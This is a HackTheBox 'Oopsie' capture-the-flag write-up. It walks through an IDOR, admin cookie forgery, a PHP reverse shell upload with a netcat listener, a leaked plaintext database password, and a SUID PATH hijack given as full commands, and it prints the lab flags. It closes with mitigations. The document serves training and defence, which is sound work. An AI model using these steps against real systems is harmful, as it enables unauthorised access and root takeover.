# HTB — Oopsie

```
 ██████╗  ██████╗ ██████╗ ███████╗██╗███████╗
██╔═══██╗██╔═══██╗██╔══██╗██╔════╝██║██╔════╝
██║   ██║██║   ██║██████╔╝███████╗██║█████╗  
██║   ██║██║   ██║██╔═══╝ ╚════██║██║██╔══╝  
╚██████╔╝╚██████╔╝██║     ███████║██║███████╗
 ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝╚══════╝
              HackTheBox — Starting Point
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — 22 (SSH), 80 (HTTP)
- [x] Web enumeration — found `/cdn-cgi/login/` login panel
- [x] Guest login → IDOR on Accounts page → admin Access ID 34322
- [x] Cookie manipulation — `user=34322; role=admin` → upload form unlocked
- [x] PHP reverse shell uploaded to `/uploads/`
- [x] Shell as `www-data`
- [x] `db.php` credential leak → `robert:M3g4C0rpUs3r!`
- [x] SSH as `robert` → user flag
- [x] SUID binary `/usr/bin/bugtracker` — PATH hijack via `/tmp/cat`
- [x] Root shell → root flag

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan | Fast port discovery |
| Nmap | Service/version fingerprinting |
| feroxbuster | Web content discovery |
| Burp Suite | Cookie manipulation and request inspection |
| curl | Endpoint probing and cookie testing |
| Firefox DevTools | Cookie inspection and modification |
| Pentest Monkey PHP reverse shell | Initial webshell payload |
| Netcat | Reverse shell listener |
| strings / objdump | Binary analysis on `bugtracker` |
| find | Group-based file discovery |
| PATH hijack (echo + chmod) | Privilege escalation via SUID |

---

## TL;DR

Apache box running a repair management web app. Guest login is available but the upload feature is locked behind an authorization check that trusts client-supplied cookies. IDOR on the Accounts page leaks the admin's numeric user ID (34322). Swapping your cookie from `user=2233` to `user=34322` bypasses the check and exposes the file upload form — no password needed. Upload a PHP reverse shell, trigger it from `/uploads/`, land as `www-data`. Read `db.php` in the webroot for `robert:M3g4C0rpUs3r!`, SSH in, grab the user flag. A SUID binary (`/usr/bin/bugtracker`) calls `cat` without a full path, making it trivially hijackable via PATH manipulation — drop a fake `cat` in `/tmp`, prepend `/tmp` to `$PATH`, run the binary, get a root shell.

---

## Introduction

Oopsie is the second box in HTB's Starting Point track and it's basically a masterclass in "trusting the client is a terrible idea." The web app hands you a guest session cookie and then assumes you'd never dream of editing it. One IDOR plus a cookie tweak later and you've got the admin's file upload form. From there it's classic PHP shell upload → credential reuse → SUID PATH hijack. No CVEs, no exotic exploits — just the application doing exactly what you tell it to, because it never learned to question you.

The attack chain touches three distinct vulnerability classes: broken access control (IDOR + cookie manipulation), insecure file upload, and a SUID binary with an unsafe `system()` call — a greatest-hits anthology for web pentesting fundamentals.

---

## Recon

### Port Scan

```bash
rustscan -a 10.129.29.145 --ulimit 5000 -b 2000 -t 2000 -- -sV -sC
```

Two open ports, nothing exotic:

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | HTTP | Apache httpd 2.4.29 (Ubuntu) |

SSH is Ubuntu 18.04-era (kernel 4.15.0-76-generic, confirmed later from the shell banner). The web title returned as "Welcome" — nondescript, which usually means there's something worth finding inside.

### Web Enumeration

```bash
feroxbuster -u http://10.129.29.145/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -x php,html,txt,bak,js,json \
  -s 200,204,301,302,307,401,403,405 -k --no-state
```

Key discoveries:

| URL | Status | Notes |
|---|---|---|
| `/cdn-cgi/login/` | 200 | Login panel |
| `/cdn-cgi/login/index.php` | 200 | Same login page |
| `/cdn-cgi/login/admin.php` | 302 → login | Admin panel (redirects unauthenticated) |
| `/cdn-cgi/login/db.php` | 200 | Empty response body — suspicious |
| `/uploads/` | 301 | Directory exists, likely upload destination |

The `/cdn-cgi/` path is worth a note: in production this path is Cloudflare's namespace. Someone thought it was a clever hiding spot, or just grabbed a template. Either way, feroxbuster found it anyway.

Also ran `searchsploit Apache 2.4.29` — nothing useful remotely exploitable without credentials. Dead end confirmed early, time to move on to the application logic.

---

## Foothold

### Login Panel — Guest Access

Browsing to `http://10.129.29.145/cdn-cgi/login/` revealed a login form with a convenient "Login as Guest" link at the bottom. Clicking it set the session cookies:

```
user=2233
role=guest
```

The app loaded a "Repair Management System" for MegaCorp Automotive with four navigation items: Account, Branding, Clients, and Uploads.

### IDOR — Leaking the Admin Access ID

The Accounts page URL pattern was immediately telling:

```
/cdn-cgi/login/admin.php?content=accounts&id=2
```

That `id=2` is a sequential integer — the single most reliable thing in web pentesting to try decrementing. Changing it to `id=1`:

```
http://10.129.29.145/cdn-cgi/login/admin.php?content=accounts&id=1
```

Returned the admin account record, leaking:

- **Name:** admin  
- **Email:** (admin email)  
- **Access ID:** **34322**

No authentication required to view someone else's account record. Classic IDOR — the app checked that you were logged in as *a* user, not that you were asking about *your* user.

### Cookie Manipulation — Bypassing Upload Authorization

The Uploads page responded with "This action require super admin rights" for the guest session. Testing cookie variations confirmed the check was on the `user` value, not `role`:

| Cookie | Uploads page result |
|---|---|
| `user=2233; role=guest` | "This action require super admin rights." |
| `user=2233; role=admin` | Same block — role alone doesn't matter |
| `user=34322; role=guest` | **Upload form appeared** |
| `user=34322; role=admin` | Upload form appeared |

The server was comparing the `user` cookie value against a database of authorized user IDs for the uploads feature. Since that value came straight from the client cookie with no signature or session binding, swapping it in Firefox DevTools (or Burp) was all it took.

The page still showed "Logged in as Guest" in the navbar — the app's identity display and its authorization check were reading from different sources. A wonderful reminder that authorization bugs don't always announce themselves.

---

## Shell / Initial Access

### PHP Reverse Shell Upload

With the upload form accessible, grabbed Pentest Monkey's PHP reverse shell from `/usr/share/webshells/php/php-reverse-shell.php`, edited the IP and port, and uploaded it via the Branding Image Uploads form with cookies set to `user=34322; role=admin`.

The server confirmed: **"The file php-reverse-shell.php has been uploaded."**

The feroxbuster scan had already revealed `/uploads/` — that's where it went. Started a listener:

```bash
nc -lvnp 4444
```

Triggered the shell by browsing to:
```
http://10.129.29.145/uploads/php-reverse-shell.php
```

```
Connection received on 10.129.29.145 53776
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell as `www-data`. Python wasn't on the box (`python: not found`), so used the classic fallback to get a stable terminal:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

Not perfect, but it works.

### Credential Discovery — db.php

Poked around the webroot looking for config files:

```bash
find /var/www/html -type f 2>/dev/null
```

`/var/www/html/cdn-cgi/login/db.php` stood out — it had returned an empty response body earlier from feroxbuster, which usually means it's a PHP file with no output (i.e., a pure config include). Reading it:

```bash
cat /var/www/html/cdn-cgi/login/db.php
```

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

Plaintext database credentials: `robert:M3g4C0rpUs3r!`

Tried them on SSH immediately — because credential reuse is a law of nature, not just a habit:

```bash
ssh robert@10.129.29.145
```

Worked. Proper shell, stable terminal, full user.

---

## Escalation Path

### User Flag

```bash
cat /home/robert/user.txt
```

```
f2c74ee8db7983851ab2a96a44eb7981
```

### Enumerating for Privilege Escalation

Standard first move — find files owned by unusual groups:

```bash
find / -group bugtracker 2>/dev/null
```

```
/usr/bin/bugtracker
```

```bash
ls -l /usr/bin/bugtracker
```

```
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

The `s` in permissions: SUID bit set, owned by root. Running it as `robert` (who is in the `bugtracker` group via `/etc/group`) means it executes with root's privileges regardless of who invoked it.

Ran it to see what it does:

```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: abs2
---------------

cat: /root/reports/abs2: No such file or directory
```

It's calling `cat /root/reports/<user_input>`. The critical question: is it calling `cat` with a full path, or relying on `$PATH`?

```bash
strings /usr/bin/bugtracker | grep -E 'cat|reports|system|exec'
```

```
system
cat /root/reports/
```

No full path on `cat`. It builds the command string with a bare `cat` and passes it to `system()`. That means whatever binary is named `cat` and appears first in `$PATH` will be executed — with root privileges, because the SUID bit elevated the process before the `system()` call happened.

---

## Exploitation

### PATH Hijack — SUID Privilege Escalation

The plan: drop a fake `cat` script in `/tmp` that spawns a shell, then make sure `/tmp` is first in `$PATH` before running the SUID binary.

```bash
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
```

```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

# id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Root shell. The fake `cat` was executed by `system()` inside the SUID process, so `uid=0` — even though `gid` and group memberships still show `robert`'s values (the effective UID was elevated by SUID; the groups weren't).

### Root Flag

The fake `cat` had replaced the real one in `$PATH`, so reading the flag with just `cat` in the root shell would recurse into our payload. Two options: call the real binary by full path, or just `ls /root` first and use a different read method.

```bash
/bin/cat /root/root.txt
```

```
af13b0bee69f8a877c3faf667f7beacf
```

---

## Rabbit Holes

**Trying to escalate via role=admin cookie alone:** The intuitive first guess after seeing `role=guest` in the cookie was to change it to `role=admin`. Tested it. The upload restriction persisted. The authorization check on the server side didn't actually read the `role` cookie value for the uploads endpoint — only `user`. Spent a few curl iterations on this before confirming the pattern from the accounts IDOR.

**searchsploit on Apache 2.4.29:** Went down the CVE rabbit hole looking for an unauthenticated Apache exploit. Nothing applicable — the relevant CVEs (path traversal 2.4.49/50) were for later versions. The application-layer vulnerabilities were always the entry point, not the web server itself.

**python pty spawn failing:** First instinct after getting the `www-data` shell was `python -c 'import pty; ...'` — the standard PTY upgrade. Got `python: not found`. The box is Ubuntu 18.04 with Python 3 only, and even that required `python3`. Switched to `/usr/bin/script -qc /bin/bash /dev/null` which gave a functional shell without the full readline/job control experience, but was stable enough.

---

## Flag

| Flag | Value |
|---|---|
| User flag | `f2c74ee8db7983851ab2a96a44eb7981` |
| Root flag | `af13b0bee69f8a877c3faf667f7beacf` |

---

## Mitigations

**IDOR on Account Records:** The accounts page should validate that the requesting user's session ID matches the `id` parameter they're querying. A user should only be able to view their own account record. At minimum, sensitive fields (access IDs, internal user identifiers) shouldn't be exposed to authenticated but unprivileged users at all.

**Client-Side Cookie Authorization:** Session state must never be trusted from the client. The `user` cookie value should be derived server-side from a cryptographically signed session token (e.g., a proper session ID tied to server-stored state). If a user modifies their cookie, the server should reject the tampered session, not obey it.

**Unrestricted File Upload:** The upload endpoint accepted any file type, including executable PHP. File uploads should:
- Validate MIME type server-side (not from `Content-Type` header alone)
- Rename uploaded files to strip dangerous extensions
- Store uploads outside the web root, or configure the upload directory to deny PHP execution (`php_flag engine off` in `.htaccess`)

**Plaintext Credentials in Source Code:** `db.php` contained a hardcoded database password in cleartext. Credentials should be loaded from environment variables or a secrets manager, never committed to or stored in application source files. File permissions should also prevent web server processes from reading config files unnecessarily.

**SUID Binary with Unsafe PATH-Dependent Command:** The `bugtracker` binary called `cat` via `system()` without specifying an absolute path. Any SUID binary that calls external commands must:
- Use absolute paths (`/bin/cat`)
- Reset `$PATH` to a known-safe value before calling `system()`
- Or avoid `system()` entirely in favor of safer alternatives (`exec*` family with explicit argument arrays)

---

## Key Takeaway

Authorization in web applications has to live on the server — never in a cookie the user controls. The entire Oopsie attack chain ran on one assumption the developers got wrong: that a client-supplied `user` value is trustworthy. Fix that one mistake and there's no IDOR, no cookie manipulation, and no path to the upload form. The rest of the chain (credential in db.php, SUID PATH hijack) are compounding mistakes that wouldn't have mattered without that first door open.

The escalation is also a good reminder that SUID binaries are permanently in scope for PATH hijack analysis. If `strings` on a SUID binary shows a bare command name — `cat`, `find`, `ls`, anything — and you control `$PATH`, you control what runs as root.

---

## If I Did It Again

I'd hit the accounts IDOR before even touching the cookie manipulation. The URL pattern (`?content=accounts&id=2`) is immediately suspicious and decrementing the ID is a two-second test — should have been the first thing tried rather than the second.

For the privesc, I'd run `strings` on every SUID binary as a first pass before even trying LinPEAS. The `bugtracker` binary analysis took about 30 seconds and the PATH hijack became immediately obvious. When `strings` shows `system` and a bare command name in the same binary, you already have the write-up.

Also worth noting for future boxes: when `python` isn't available for PTY upgrade, `script -qc /bin/bash /dev/null` is a reliable fallback. Worth having that in muscle memory.

---

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-10-17 | Initial writeup |

---

<a name="top"></a>[↑ Back to top](#table-of-contents)
